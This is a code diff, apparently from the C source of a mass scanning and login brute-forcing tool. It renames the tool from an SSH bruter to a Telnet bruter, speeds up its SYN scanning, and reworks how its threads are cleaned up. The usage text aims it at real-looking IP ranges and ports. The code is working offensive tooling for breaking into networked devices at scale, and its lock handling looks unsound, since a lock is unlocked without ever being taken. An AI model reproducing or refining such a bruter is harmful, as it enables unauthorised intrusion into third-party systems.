@@ -53,27 +53,41 @@ void* thread_timer() {
 		struct hash_struct *hs, *hstmp;
 
 		HASH_ITER(hh, done_ips, hs, hstmp) {
-			if((!hs->done && !hs->attempts && (time(NULL) - hs->start_time >= 25)) || (hs->done && (time(NULL) - hs->start_time >= 20)) || (time(NULL) - hs->start_time >= 45)) {
-				if(pthread_cancel(hs->threadID) == 0) {
-					if(hs->session != NULL) {
-						libssh2_session_free(hs->session);
-					}
+
+			if(((!hs->attempts && !hs->done) && (time(NULL) - hs->start_time >= 20)) || (hs->done && (time(NULL) - hs->start_time >= 30)) || (time(NULL) - hs->start_time >= 40)) {
+
+				pthread_rwlock_init(&rwlock, NULL);
+
+				if(!hs->done && pthread_cancel(hs->threadID) == 0) {
+
 					free(hs->arguments->ip);
 					free(hs->arguments);
 					HASH_DEL(done_ips, hs);
                         		free(hs);
 					running_threads--;
+					pthread_rwlock_unlock(&rwlock);
+
 				} else if(hs->done == 1) {
-					if(hs->session != NULL) {
-						libssh2_session_free(hs->session);
-					}
+
 					free(hs->arguments->ip);
 					free(hs->arguments);
 					HASH_DEL(done_ips, hs);
 	                        	free(hs);
+					running_threads--;
+					pthread_rwlock_unlock(&rwlock);
+
+				} else {
+
+					free(hs->arguments->ip);
+                                        free(hs->arguments);
+                                        HASH_DEL(done_ips, hs);
+                                        free(hs);
+					running_threads--;
+					pthread_rwlock_unlock(&rwlock);
 				}
 			}
     		}
+
 		sleep(1);
 	}
 }
@@ -83,7 +97,7 @@ int main(int argc, char* argv[]) {
 	srand((unsigned) time(&randomTime));
 
 	if(argc != 3) {
-		printf("SSH Bruter Usage: %s <IP/CIDR> <Port1,Port2,...>\n", argv[0]);
+		printf("Telnet Bruter Usage: %s <IP/CIDR> <Port1,Port2,...>\n", argv[0]);
 		printf("Examples:\n");
 		printf("\t%s 166.104.0.0/16 80,443,8080\n", argv[0]);
 		printf("\t%s 35.186.153.3 80,443,8080\n", argv[0]);
@@ -93,7 +107,6 @@ int main(int argc, char* argv[]) {
 
 	printf("\nSYN scan [%s]:[%s]\n", argv[1], argv[2]);
 
-	libssh2_init(0);
 	pthread_rwlock_init(&rwlock, NULL);
 
 	char* port_list = malloc(strlen(argv[2]) + 1);
@@ -140,12 +153,11 @@ int main(int argc, char* argv[]) {
 
 	for(host_count = 0; host_count < num_hosts; host_count++) {
 
-		while(running_threads >= 100) {
-			//printf("Sender sleeping. %i threads.\n", running_threads);
+		while(HASH_COUNT(done_ips) >= 100) {
                 	usleep(5);
                 }
 
-		usleep(400);
+		usleep(5);
 
 		dest_ip.s_addr = target_in_addr.s_addr;
 
@@ -195,10 +207,9 @@ int main(int argc, char* argv[]) {
 
 	sleep(3);
 
-//	while(HASH_COUNT(done_ips) > 0 || 1 == 1) {
 	while(1) {
-		//printf("Hashes: %u\n", HASH_COUNT(done_ips));
-		//printf("Running threads: %u\n", HASH_COUNT(done_ips));
+		printf("Hashes: %u\n", HASH_COUNT(done_ips));
+		printf("Running threads: %u\n", running_threads);
 		sleep(1);
 	}
 
